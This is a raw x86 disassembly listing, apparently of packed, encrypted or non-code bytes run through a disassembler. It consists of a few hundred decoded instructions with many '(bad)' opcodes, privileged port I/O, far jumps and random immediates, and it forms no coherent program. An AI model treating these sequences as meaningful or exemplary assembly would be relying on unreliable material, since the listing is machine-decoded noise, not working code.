  42dda7:	cmp    ebp,DWORD PTR [edx+esi*4]
  42ddaa:	and    DWORD PTR [esi+0x64],0x3c
  42ddae:	dec    edx
  42ddaf:	icebp  
  42ddb0:	cmp    BYTE PTR [edi+0x50eeb2],bh
	...
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x45be9707
  42de25:	or     eax,DWORD PTR [eax+0x70001eb]
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    dh,bl
  42de2f:	(bad)  
  42de30:	mov    edx,DWORD PTR [esp]
  42de33:	popa   
  42de34:	push   esi
  42de35:	xchg   DWORD PTR [ebp+ebx*4-0x3f],esp
  42de39:	and    DWORD PTR [edi-0x42c7578e],ebp
  42de3f:	pop    ss
  42de40:	ficom  DWORD PTR [esi+ebx*8]
  42de43:	mov    ah,0x2c
  42de45:	loop   0x42de84
  42de47:	or     esi,DWORD PTR [esi-0x3e]
  42de4a:	and    esi,DWORD PTR [eax-0x6cdae8c2]
  42de50:	cwde   
  42de51:	clc    
  42de52:	and    al,BYTE PTR [eax+0x12e4e635]
  42de58:	jb     0x42dde3
  42de5a:	push   esp
  42de5b:	addr16 in al,0x25
  42de5e:	imul   esi,DWORD PTR [ecx-0x55],0xcb057c9f
  42de65:	push   ebp
  42de66:	out    dx,eax
  42de67:	lods   al,BYTE PTR ds:[esi]
  42de68:	jmp    0x42ddf4
  42de6a:	cmc    
  42de6b:	shl    BYTE PTR [ebx],1
  42de6d:	jb     0x42dec2
  42de6f:	push   ebp
  42de70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42de71:	mov    ds:0xac5f9ef0,al
  42de76:	sub    ebx,DWORD PTR [eax-0x5e]
  42de79:	mov    bl,0xbc
  42de7b:	sub    al,0x47
  42de7d:	mov    al,ds:0xa2eb9e90
  42de82:	je     0x42de2b
  42de84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de85:	jae    0x42de5f
  42de87:	mov    BYTE PTR [ebx+edi*8-0x1b],bh
  42de8b:	sar    BYTE PTR [ecx+0x34],0xfc
  42de8f:	and    ch,BYTE PTR [esi+0x75]
  42de92:	aaa    
  42de93:	lds    esp,FWORD PTR [ebx+0x68]
  42de96:	mov    ds,WORD PTR [edx]
  42de98:	ss (bad) 
  42de9a:	imul   esp,DWORD PTR [esi+ebp*2+0x6aa301f5],0xffffff9d
  42dea2:	mov    ds:0xc384d460,eax
  42dea7:	nop
  42dea8:	mul    DWORD PTR [edi-0x62]
  42deab:	outs   dx,BYTE PTR ds:[esi]
  42deac:	xor    edi,DWORD PTR [edi-0xc]
  42deaf:	mov    dh,0x32
  42deb1:	stc    
  42deb2:	inc    ebp
  42deb3:	dec    ecx
  42deb4:	cmp    al,0xf5
  42deb6:	inc    ebx
  42deb7:	sti    
  42deb8:	mov    cl,0x6a
  42deba:	imul   eax,DWORD PTR [ebp-0x5d749e91],0xc91a8605
  42dec4:	hlt    
  42dec5:	push   0x42
  42dec7:	aad    0x4d
  42dec9:	or     ecx,DWORD PTR [edi+0x24]
  42decc:	int    0xc0
  42dece:	jge    0x42de6c
  42ded0:	and    DWORD PTR ds:0x78eb635c,esp
  42ded6:	sub    DWORD PTR [eax],edi
  42ded8:	jmp    0xf84c:0xe951839f
  42dedf:	mov    ebx,0x585563df
  42dee4:	icebp  
  42dee5:	iret   
  42dee6:	lea    ebp,[ebx-0x3d]
  42dee9:	xlat   BYTE PTR ds:[ebx]
  42deea:	push   esp
  42deeb:	faddp  st(5),st
  42deed:	data16 repnz mov ah,0x53
  42def1:	imul   esi,DWORD PTR [ebp+edi*4-0xe],0xc6d4c30
  42def9:	mov    ebx,0xefec92cd
  42defe:	cs pop ebp
  42df00:	ficom  DWORD PTR [eax+0x42]
  42df03:	test   al,0x86
  42df05:	jno    0x42df03
  42df07:	hlt    
  42df08:	ins    DWORD PTR es:[edi],dx
  42df09:	inc    esi
  42df0a:	out    0xf9,al
  42df0c:	xchg   esp,eax
  42df0d:	jne    0x42ded0
  42df0f:	dec    esp
  42df10:	jnp    0x42df6c
  42df12:	mov    cl,0x5c
  42df14:	jg     0x42def9
  42df16:	bound  edi,QWORD PTR [edx]
  42df18:	daa    
  42df19:	fdivr  QWORD PTR [esi]
  42df1b:	fsub   QWORD PTR [edx]
  42df1d:	hlt    
  42df1e:	add    dh,ch
  42df20:	adc    eax,0x8be597f9
  42df25:	out    0xde,al
  42df27:	adc    DWORD PTR [ebx],esi
  42df29:	fwait
  42df2a:	mov    esi,0x891fbadd
  42df2f:	imul   edx,DWORD PTR [eax+0x10c1ad6c],0x0
	...
  42df96:	add    bh,dh
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	clc    
  42dfa3:	test   al,0x72
  42dfa5:	cmp    eax,DWORD PTR [edi+0x70001ec]
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    ah,ah
  42dfaf:	dec    edi
  42dfb0:	push   es
  42dfb1:	out    dx,al
  42dfb2:	inc    esi
  42dfb3:	xchg   ebp,eax
  42dfb4:	adc    al,0x93
  42dfb6:	pop    edx
  42dfb7:	mov    esp,esp
  42dfb9:	sbb    esp,DWORD PTR [ebx]
  42dfbb:	and    ch,dh
  42dfbd:	aaa    
  42dfbe:	xor    ecx,DWORD PTR [ebp+edx*4-0x7d]
  42dfc2:	jge    0x42e037
  42dfc4:	push   ebx
  42dfc5:	sub    dl,BYTE PTR [esi+0x1d]
  42dfc8:	xor    ebx,DWORD PTR [eax+0x44]
  42dfcb:	xchg   esp,eax
  42dfcc:	adc    ebx,DWORD PTR ds:0xde7728a1
  42dfd2:	lahf   
  42dfd3:	xor    BYTE PTR [edi-0x1a],dh
  42dfd6:	in     al,dx
  42dfd7:	or     ebx,DWORD PTR [eax+0x15]
  42dfda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dfdb:	out    dx,eax
  42dfdc:	add    al,0xd0
  42dfde:	sub    DWORD PTR [eax-0x66],ebp
  42dfe1:	and    al,BYTE PTR [ebx-0x7c11e9e]
  42dfe7:	test   DWORD PTR [edx-0x24396e0e],edi
  42dfed:	add    DWORD PTR [ebp+esi*2-0x3e69eaa4],0x5c
  42dff5:	ret    
  42dff6:	mov    ah,0xf8
  42dff8:	ja     0x42e065
  42dffa:	cli    
  42dffb:	mov    al,ds:0xb83b58be
  42e000:	hlt    
  42e001:	mov    bh,0x1b
  42e003:	inc    eax
  42e004:	mov    BYTE PTR [eax-0x59],bh
  42e007:	mov    ds:0xc54fc6b3,al
  42e00c:	popa   
  42e00d:	test   BYTE PTR [edx],ch
  42e00f:	nop
  42e010:	int3   
  42e011:	leave  
  42e012:	rcl    esi,cl
  42e014:	clc    
  42e015:	xor    DWORD PTR [esi-0x62],esi
  42e018:	jg     0x42e08b
  42e01a:	out    0xe4,eax
  42e01c:	dec    edi
  42e01d:	cmc    
  42e01e:	mov    gs,ecx
  42e020:	mov    eax,0xf7882e7a
  42e025:	loope  0x42dffb
  42e027:	mov    edi,0x9976666d
  42e02c:	push   edi
  42e02d:	sbb    BYTE PTR [edx+0x3a],cl
  42e030:	jecxz  0x42e012
  42e032:	stc    
  42e033:	mov    ah,0xdb
  42e035:	les    ebp,FWORD PTR [esi]
  42e037:	add    al,0x16
  42e039:	retf   0x6205
  42e03c:	cmp    eax,0xe32e190f
  42e041:	xchg   ebx,eax
  42e042:	stos   BYTE PTR es:[edi],al
  42e043:	retf   0x7e8b
  42e046:	addr16 fwait
  42e048:	adc    eax,edx
  42e04a:	jmp    0xa1cd:0xa199462b
  42e051:	shl    BYTE PTR [edi+0x20],cl
  42e054:	ret    0x4f3e
  42e057:	mov    ebx,0x2fabda7c
  42e05c:	outs   dx,DWORD PTR ds:[esi]
  42e05d:	push   ecx
  42e05e:	aam    0x8d
  42e060:	in     eax,0x69
  42e062:	pop    ebx
  42e063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e064:	sub    BYTE PTR [esi+eiz*2],cl
  42e067:	into   
  42e068:	dec    edi
  42e069:	in     al,0x64
  42e06b:	xchg   esp,eax
  42e06c:	and    al,0xfb
  42e06e:	inc    esp
  42e06f:	(bad)  
  42e070:	(bad)  
  42e071:	cld    
  42e072:	pop    edx
  42e073:	std    
  42e074:	xchg   ecx,eax
  42e075:	das    
  42e076:	adc    al,BYTE PTR [ecx+ebx*1]
  42e079:	mov    bl,0x8c
  42e07b:	push   ecx
  42e07c:	adc    DWORD PTR [esi-0x31],0xffffff8f
  42e080:	xor    edx,DWORD PTR [edx]
  42e082:	retf   
  42e083:	xchg   esp,eax
  42e084:	imul   BYTE PTR [edi-0x4c70ccc7]
  42e08a:	dec    edi
  42e08b:	stos   BYTE PTR es:[edi],al
  42e08c:	fwait
  42e08d:	int    0x9e
  42e08f:	inc    esp
  42e090:	mov    al,ds:0x23743f1e
  42e095:	outs   dx,BYTE PTR ds:[esi]
  42e096:	test   eax,0xfb6783d0
  42e09b:	jmp    0x42e071
  42e09d:	adc    DWORD PTR ds:0x37cb030a,edx
  42e0a3:	out    dx,al
  42e0a4:	cwde   
  42e0a5:	xchg   edx,eax
  42e0a6:	adc    DWORD PTR [edx+0x7b],edi
  42e0a9:	into   
  42e0aa:	sub    eax,0xe0b66b55
  42e0af:	in     al,dx
  42e0b0:	xor    DWORD PTR [edi],ebp
  42e0b2:	cmp    ebx,ebp
  42e0b4:	add    BYTE PTR [eax],0x0
	...
  42e113:	add    BYTE PTR [eax],al
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	mov    dh,0x9f
  42e124:	and    bh,dh
  42e126:	mov    gs,ebp
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [ecx],dl
  42e12f:	repnz loop 0x42e0ef
  42e132:	mov    edx,0x8f615438
  42e137:	pushf  
  42e138:	scas   eax,DWORD PTR es:[edi]
  42e139:	lahf   
  42e13a:	adc    al,0xfe
  42e13c:	and    eax,0x18f56017
  42e141:	fistp  QWORD PTR [esi]
  42e143:	bound  ebx,QWORD PTR [edi]
  42e145:	outs   dx,BYTE PTR ds:[esi]
  42e146:	aas    
  42e147:	out    dx,eax
  42e148:	fld    QWORD PTR [ebp-0x474604e3]
  42e14e:	cmp    BYTE PTR [edi+edi*2-0x80],bl
  42e152:	ror    DWORD PTR [ecx+0x1e],cl
  42e155:	add    ebp,edx
  42e157:	sahf   
  42e158:	inc    eax
  42e159:	adc    al,0x2b
  42e15b:	dec    edx
  42e15c:	xlat   BYTE PTR ds:[ebx]
  42e15d:	jno    0x42e0e3
  42e15f:	enter  0x2617,0x40
  42e163:	call   0x3d72:0x4a36964b
  42e16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e16b:	jbe    0x42e187
  42e16d:	inc    ebp
  42e16e:	sbb    eax,0xc14a8aa8
  42e173:	push   esi
  42e174:	das    
  42e175:	inc    edi
  42e176:	iret   
  42e177:	mov    esi,ecx
  42e179:	sub    eax,0x4b8112e5
  42e17e:	jno    0x42e116
  42e180:	or     ah,BYTE PTR [ebx]
  42e182:	pushf  
  42e183:	fs push ebp
  42e185:	outs   dx,DWORD PTR ds:[esi]
  42e186:	retf   0x35e
  42e189:	(bad)  
  42e18a:	hlt    
  42e18b:	and    ah,BYTE PTR [esi]
  42e18d:	ret    
  42e18e:	stc    
  42e18f:	push   ebp
  42e190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e191:	adc    bh,BYTE PTR [ecx]
  42e193:	xor    DWORD PTR [edi+0x43],ebp
  42e196:	jp     0x42e1ea
  42e198:	jle    0x42e1d7
  42e19a:	popa   
  42e19b:	div    BYTE PTR [edx+ebp*8]
  42e19e:	push   dx
  42e1a0:	in     eax,dx
  42e1a1:	jmp    0xd752a662
  42e1a6:	mov    esi,0x986ee092
  42e1ab:	ss out 0x7d,eax
  42e1ae:	repnz (bad) 
  42e1b0:	mov    ch,0x15
  42e1b2:	mov    ch,0xeb
  42e1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e1b5:	push   esp
  42e1b6:	or     DWORD PTR [edi],ebp
  42e1b8:	in     eax,0xf3
  42e1ba:	xchg   edi,eax
  42e1bb:	push   0x36
  42e1bd:	test   eax,0xe86c3191
  42e1c2:	sbb    bl,bh
  42e1c4:	cmovg  ecx,DWORD PTR [ecx+0x3e]
  42e1c8:	(bad)  
  42e1c9:	ror    BYTE PTR [eax+0xa079431],1
  42e1cf:	cmp    eax,DWORD PTR gs:[ecx-0x40a01bc6]
  42e1d6:	imul   ebx,DWORD PTR [edi+eiz*8],0xffffffa1
  42e1da:	repnz push es
  42e1dc:	and    BYTE PTR [ebx+0x23],dh
  42e1df:	mov    cl,0x20
  42e1e1:	jnp    0x42e165
  42e1e3:	and    ah,0x48
  42e1e6:	dec    edx
  42e1e7:	fidiv  WORD PTR [esp+edx*8+0xb]
  42e1eb:	push   ebp
  42e1ec:	gs push ds
  42e1ee:	mov    dh,0x99
  42e1f0:	add    BYTE PTR [ebx+edx*8-0x16],bh
  42e1f4:	inc    esp
  42e1f5:	out    0x95,al
  42e1f7:	add    bl,BYTE PTR [esi-0x172dc9f4]
  42e1fd:	or     ah,BYTE PTR [eax+0x4de86f37]
  42e203:	cmp    BYTE PTR [esi+0x389807d0],dl
  42e209:	rol    DWORD PTR [esi],0xb8
  42e20c:	jbe    0x42e26c
  42e20e:	out    dx,al
  42e20f:	or     ecx,DWORD PTR [ebx]
  42e211:	pop    es
  42e212:	mov    BYTE PTR cs:[edx-0x5ed06d45],ch
  42e219:	sub    BYTE PTR [ecx-0x32],dh
  42e21c:	retf   0x56ab
  42e21f:	mov    ah,0xea
  42e221:	jo     0x42e1b1
  42e223:	cmp    ch,dl
  42e225:	push   edi
  42e226:	sbb    esi,ebx
  42e228:	cmp    al,BYTE PTR [esi-0x75]
  42e22b:	xchg   BYTE PTR [ebp+eiz*4+0x7e],dl
  42e22f:	neg    DWORD PTR [edx-0xd85844a]
	...
  42e295:	add    BYTE PTR [ebp-0x655875c3],ch
  42e29b:	mov    bh,0xad
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0x2c04e0f2
  42e2a5:	add    dl,BYTE PTR [ebp+0x70001ee]
  42e2ab:	add    DWORD PTR [eax],eax
  42e2ad:	add    bl,bl
  42e2af:	jne    0x42e28a
  42e2b1:	fidiv  WORD PTR [ebx+0x7e]
  42e2b4:	add    al,0xb1
  42e2b6:	adc    ecx,DWORD PTR [edx]
  42e2b8:	inc    ecx
  42e2b9:	enter  0xf623,0x6e
  42e2bd:	cmp    al,0xa6
  42e2bf:	xchg   edx,eax
  42e2c0:	push   cs
  42e2c1:	mov    BYTE PTR [ebp-0x567f9528],0x94
  42e2c8:	jnp    0x42e293
  42e2ca:	mov    bh,0x18
  42e2cc:	mov    edx,0x3db48e05
  42e2d1:	les    edx,FWORD PTR [ebp+0x26980261]
  42e2d7:	data16 mov sp,0xb986
  42e2dc:	xor    BYTE PTR [esi],ch
  42e2de:	mov    al,0xb2
  42e2e0:	inc    ebx
  42e2e1:	push   0x5cf33e2d
  42e2e6:	fwait
  42e2e7:	push   ebp
  42e2e8:	xchg   edx,eax
  42e2e9:	cmp    DWORD PTR [edx+0x4cbd5979],ecx
  42e2ef:	nop
  42e2f0:	frstor ds:0x5b220f02
  42e2f6:	sbb    ebx,DWORD PTR [ecx+0x1a]
  42e2f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e2fa:	pop    ss
  42e2fb:	xor    esp,0xb02d7ecc
  42e301:	jge    0x42e2b0
  42e303:	dec    esp
  42e304:	scas   eax,DWORD PTR es:[edi]
  42e305:	rol    DWORD PTR [eax+0x5b23dc4e],cl
  42e30b:	mov    al,0x86
  42e30d:	mul    DWORD PTR [esi+eiz*1]
  42e310:	jg     0x42e371
  42e312:	imul   edx,DWORD PTR [ebx-0x19],0xffffff9e
  42e316:	xchg   ch,ch
  42e318:	sub    al,0x20
  42e31a:	adc    ebx,DWORD PTR [edi]
  42e31c:	dec    ebx
  42e31d:	mov    ecx,0x23ca7376
  42e322:	out    0xbf,eax
  42e324:	or     ebp,DWORD PTR [ecx+edx*1+0x3]
  42e328:	stos   DWORD PTR es:[edi],eax
  42e329:	mov    edx,0x4280d888
  42e32e:	xor    DWORD PTR [ebx+0x48d8da28],ebx
  42e334:	add    esp,DWORD PTR fs:[edi]
  42e337:	ja     0x42e319
  42e339:	xor    al,0xa6
  42e33b:	push   ds
  42e33c:	nop
  42e33d:	fwait
  42e33e:	daa    
  42e33f:	fmul   st(4),st
  42e341:	cmp    al,0xdd
  42e343:	mov    ds:0xd1b2389f,al
  42e348:	std    
  42e349:	add    bh,BYTE PTR [edx]
  42e34b:	add    eax,0xd622fa61
  42e350:	mov    cl,0xec
  42e352:	inc    ebx
  42e353:	repz mov ebp,0x945a383f
  42e359:	js     0x42e3b0
  42e35b:	jg     0x42e310
  42e35d:	mov    ds:0x86b59b5b,al
  42e362:	pop    es
  42e363:	(bad)  
  42e365:	vpsrlw ymm2,ymm2,xmm2
  42e369:	sub    eax,0x7209e254
  42e36e:	push   cs
  42e36f:	mov    DWORD PTR [edi-0x49a4ade9],esi
  42e375:	outs   dx,BYTE PTR ds:[esi]
  42e376:	xchg   ebp,eax
  42e377:	dec    ebx
  42e378:	rcpps  xmm3,xmm7
  42e37b:	sbb    DWORD PTR [edx+edi*2],esi
  42e37e:	push   esi
  42e37f:	sub    ebp,eax
  42e381:	rcl    eax,cl
  42e383:	sar    dl,1
  42e385:	popf   
  42e386:	aas    
  42e387:	aaa    
  42e388:	jmp    0x42e3dd
  42e38a:	mov    BYTE PTR cs:[edi-0x74],al
  42e38e:	mov    ch,0x4a
  42e390:	and    DWORD PTR [ecx-0xf7d211],0xffffffe8
  42e397:	sbb    al,0xed
  42e399:	fwait
  42e39a:	mov    edx,0x5c975685
  42e39f:	dec    edx
  42e3a0:	xchg   edi,eax
  42e3a1:	fstp   DWORD PTR [ecx+0x2e]
  42e3a4:	dec    edi
  42e3a5:	daa    
  42e3a6:	retf   0x48ae
  42e3a9:	inc    esi
  42e3aa:	test   DWORD PTR [edx],eax
  42e3ac:	push   edi
  42e3ad:	sub    BYTE PTR [esi+0x1c8d417c],dl
  42e3b3:	bound  eax,QWORD PTR [bx+si]
	...
  42e416:	loop   0x42e3d5
  42e418:	fadd   st(7),st
  42e41a:	(bad)  
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	cmovl  ebp,DWORD PTR [eax+0x1ef9c5d]
  42e429:	add    BYTE PTR [edi],al
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [ebx+ecx*2+0x62],al
  42e431:	pop    ebp
  42e432:	xchg   ebp,eax
  42e433:	lock mov dh,0x98
  42e436:	retf   
  42e437:	push   ecx
  42e438:	ss jae 0x42e422
  42e43b:	and    WORD PTR [eax],0x65
  42e43f:	idiv   ah
  42e441:	and    al,0xc4
  42e443:	ja     0x42e4b3
  42e445:	aaa    
  42e446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e447:	fcmovb st,st(6)
  42e449:	push   esp
  42e44a:	(bad)  
  42e44b:	mov    ch,0x60
  42e44d:	xor    al,0xa9
  42e44f:	cmp    BYTE PTR [edi+ecx*4],al
  42e452:	pusha  
  42e453:	inc    ebx
  42e454:	xor    DWORD PTR [edi-0x5a],esp
  42e457:	push   cs
  42e458:	je     0x42e4c0
  42e45a:	rol    BYTE PTR [edx+0xd6988a1],0x75
  42e461:	push   cs
  42e462:	and    al,BYTE PTR [ebp-0x58]
  42e465:	mov    ebx,0x92429966
  42e46a:	xor    ah,cl
  42e46c:	mov    ecx,0xceb60f9e
  42e471:	retf   0xc49
  42e474:	ins    DWORD PTR es:[edi],dx
  42e475:	mov    esi,0xe0dd202b
  42e47a:	and    al,0x12
  42e47c:	mov    bh,0xc3
  42e47e:	pop    ebx
  42e47f:	jb     0x42e43d
  42e481:	frstor [eax-0x1c863284]
  42e487:	leave  
  42e488:	xchg   edi,eax
  42e489:	mov    ds:0xe08f7017,eax
  42e48e:	hlt    
  42e48f:	sbb    al,0xe3
  42e491:	out    dx,al
  42e492:	rol    esp,1
  42e494:	hlt    
  42e495:	xchg   edi,eax
  42e496:	add    ch,BYTE PTR [esi]
  42e498:	xor    ebx,DWORD PTR [eax]
  42e49a:	jge    0x42e440
  42e49c:	shl    BYTE PTR ds:0x58a77eb,1
  42e4a2:	pop    es
  42e4a3:	cld    
  42e4a4:	jb     0x42e4fb
  42e4a6:	fisttp QWORD PTR [ecx-0x9]
  42e4a9:	pop    eax
  42e4aa:	add    ebx,esp
  42e4ac:	into   
  42e4ad:	cmp    BYTE PTR fs:[edx+edi*2],0x90
  42e4b2:	out    0xc0,eax
  42e4b4:	aam    0xeb
  42e4b6:	es xchg esp,eax
  42e4b8:	and    BYTE PTR [esi-0x1d],bh
  42e4bb:	mov    dh,0x15
  42e4bd:	sti    
  42e4be:	shl    DWORD PTR [ecx-0x6f],0x72
  42e4c2:	sbb    DWORD PTR [edi],eax
  42e4c4:	test   eax,0x6f4bda95
  42e4c9:	lods   al,BYTE PTR ds:[esi]
  42e4ca:	push   ecx
  42e4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4cc:	das    
  42e4cd:	xor    ah,BYTE PTR [ebx]
  42e4cf:	mov    eax,0x1a5ef7d3
  42e4d4:	test   al,0x46
  42e4d6:	outs   dx,DWORD PTR ds:[esi]
  42e4d7:	mov    dh,0xd
  42e4d9:	scas   al,BYTE PTR es:[edi]
  42e4da:	adc    cl,cl
  42e4dc:	mov    edx,0xd4481b8f
  42e4e1:	rcr    DWORD PTR [ecx],cl
  42e4e3:	mov    cl,0x3e
  42e4e5:	and    eax,0x1673aad4
  42e4ea:	fdivrp st(1),st
  42e4ec:	fsubr  st(1),st
  42e4ee:	adc    BYTE PTR [edi*1+0xed31156],0x86
  42e4f6:	popa   
  42e4f7:	leave  
  42e4f8:	mov    ecx,0xa06905c
  42e4fd:	xor    eax,0x3bde2526
  42e502:	jl     0x42e4d7
  42e504:	inc    edi
  42e505:	(bad)  
  42e506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e507:	jae    0x42e4cf
  42e509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e50a:	jecxz  0x42e509
  42e50c:	jg     0x42e53c
  42e50e:	mov    BYTE PTR [eax],dh
  42e510:	cmp    cl,ch
  42e512:	xchg   BYTE PTR [ecx-0x6165b496],ah
  42e518:	sub    BYTE PTR [ebx-0x141a0b72],dh
  42e51e:	pop    es
  42e51f:	dec    esi
  42e520:	jbe    0x42e571
  42e522:	push   0xffffff9c
  42e524:	addr16 dec esi
  42e526:	shr    DWORD PTR [ecx+0x62],1
  42e529:	inc    esp
  42e52a:	daa    
  42e52b:	jno    0x42e54b
  42e52d:	push   ss
  42e52e:	jno    0x42e524
  42e530:	mov    cl,0xe2
  42e532:	xchg   edi,eax
  42e533:	pop    edi
  42e534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42e595:	add    BYTE PTR [ebp+0x38],dl
  42e598:	into   
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	lock mov BYTE PTR [ecx],0x66
  42e5a6:	mov    ds:0x70001f0,eax
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [eax],dl
  42e5af:	pop    ds
  42e5b0:	ret    0xc71f
  42e5b3:	loop   0x42e587
  42e5b5:	mov    ah,0xbd
  42e5b7:	dec    edi
  42e5b8:	or     al,0xa4
  42e5ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5bb:	add    BYTE PTR [ecx-0x39],0x5f
  42e5bf:	inc    ebx
  42e5c0:	(bad)  
  42e5c2:	shl    esi,cl
  42e5c4:	mov    al,0x2b
  42e5c6:	push   ds
  42e5c7:	jge    0x42e576
  42e5c9:	push   esi
  42e5ca:	fdiv   st,st(0)
  42e5cc:	retf   0x187e
  42e5cf:	and    dl,BYTE PTR [ecx+0x6d]
  42e5d2:	lds    edx,FWORD PTR [ecx+esi*4+0x291c69e4]
  42e5d9:	or     DWORD PTR [esp+esi*8-0x3b],ebp
  42e5dd:	push   ebp
  42e5de:	into   
  42e5df:	mov    ebx,0x32a5bade
  42e5e4:	mov    ch,0xe5
  42e5e6:	xchg   BYTE PTR [edi-0xe],cl
  42e5e9:	jns    0x42e5c6
  42e5eb:	sub    esp,DWORD PTR [eax]
  42e5ed:	cld    
  42e5ee:	clc    
  42e5ef:	cld    
  42e5f0:	pop    eax
  42e5f1:	dec    esi
  42e5f2:	jb     0x42e5d9
  42e5f4:	inc    ebx
  42e5f5:	mov    ds:0x9b53be93,eax
  42e5fa:	jne    0x42e5d7
  42e5fc:	daa    
  42e5fd:	sahf   
  42e5fe:	push   esp
  42e5ff:	ins    DWORD PTR es:[edi],dx
  42e600:	popf   
  42e601:	sub    eax,0x3a1d5122
  42e606:	jmp    0x25e0:0x365edaec
  42e60d:	jle    0x42e668
  42e60f:	retf   0xb773
  42e612:	cdq    
  42e613:	imul   ebx,DWORD PTR [ebp+0x9],0x77
  42e617:	outs   dx,BYTE PTR ds:[esi]
  42e618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e619:	and    eax,0x8da0ce8e
  42e61e:	gs mov eax,0xcfa726
  42e624:	stc    
  42e625:	pop    edx
  42e626:	bnd jno 0x42e657
  42e629:	(bad)  
  42e62a:	leave  
  42e62b:	push   ebp
  42e62c:	push   ebx
  42e62d:	push   ebx
  42e62e:	sub    dh,BYTE PTR [ebx+0x2eb0450]
  42e634:	popf   
  42e635:	add    cl,BYTE PTR [ebx-0x14]
  42e638:	push   ebx
  42e639:	arpl   WORD PTR [eax],bx
  42e63b:	add    DWORD PTR [ecx+0x3],ebp
  42e63e:	sbb    cl,dh
  42e640:	mov    eax,0xd3fb0333
  42e645:	in     eax,0xcb
  42e647:	sub    esi,DWORD PTR [edx+0x34]
  42e64a:	mov    ebp,DWORD PTR [eax+0xdc27db9]
  42e650:	mov    bl,0x3f
  42e652:	out    0xf,al
  42e654:	cmp    eax,0xbbf2df91
  42e659:	mov    fs,WORD PTR [esi+0x6b636ffa]
  42e65f:	test   DWORD PTR [ebp+0x1c],esi
  42e662:	gs jl  0x42e6b0
  42e665:	inc    edi
  42e666:	jbe    0x42e681
  42e668:	jo     0x42e618
  42e66a:	xchg   ebx,eax
  42e66b:	sub    eax,0xefc17b28
  42e670:	rcl    DWORD PTR [ecx+esi*1-0xd],0xc9
  42e675:	jg     0x42e64a
  42e677:	xor    eax,DWORD PTR [edx-0x2f967f8a]
  42e67d:	je     0x42e655
  42e67f:	pop    ss
  42e680:	rol    BYTE PTR [ecx-0x1ac0a416],cl
  42e686:	mov    dh,0xcd
  42e688:	lods   eax,DWORD PTR ds:[esi]
  42e689:	shl    al,0x55
  42e68c:	loopne 0x42e671
  42e68e:	test   al,0x96
  42e690:	movntq QWORD PTR [bx+si-0x2f],mm3
  42e695:	mov    ds:0xd0830ae1,eax
  42e69a:	jl     0x42e6fc
  42e69c:	fisub  WORD PTR [ebx]
  42e69e:	pop    esp
  42e69f:	aaa    
  42e6a0:	lahf   
  42e6a1:	sbb    BYTE PTR [ebx+0xe],cl
  42e6a4:	cmp    eax,0x4be5f9ca
  42e6a9:	cmp    dh,ch
  42e6ab:	sbb    edi,DWORD PTR [esi-0x4016c7be]
  42e6b1:	lahf   
  42e6b2:	cwde   
  42e6b3:	(bad)  
  42e6b4:	add    BYTE PTR [bx+si],al
	...
  42e713:	add    BYTE PTR [eax],al
  42e715:	add    BYTE PTR [edx+0x39],bl
  42e718:	dec    esi
  42e719:	sub    eax,0x7f7b7f6f
  42e71e:	scas   al,BYTE PTR es:[edi]
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	push   esp
  42e723:	adc    eax,0xf1aa65d8
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    ah,dh
  42e72f:	dec    bx
  42e731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e732:	add    eax,0x3b6ac887
  42e737:	in     eax,dx
  42e738:	xchg   ebx,eax
  42e739:	jns    0x42e7a7
  42e73b:	imul   ecx,DWORD PTR [ebx-0x19a9a41e],0x3d02f4cc
  42e745:	fldcw  WORD PTR [ebx-0x24]
  42e748:	and    dl,BYTE PTR [ebx-0x77]
  42e74b:	and    BYTE PTR [ecx+eiz*2-0x3b],ch
  42e74f:	add    DWORD PTR [esi],esi
  42e751:	loop   0x42e73c
  42e753:	or     eax,0x45f3039a
  42e758:	jle    0x42e777
  42e75a:	in     al,0x76
  42e75c:	ficom  WORD PTR [ebp-0x17]
  42e75f:	lds    esi,FWORD PTR [eax-0x766720ee]
  42e765:	sub    al,BYTE PTR [edx-0x2f]
  42e768:	inc    esp
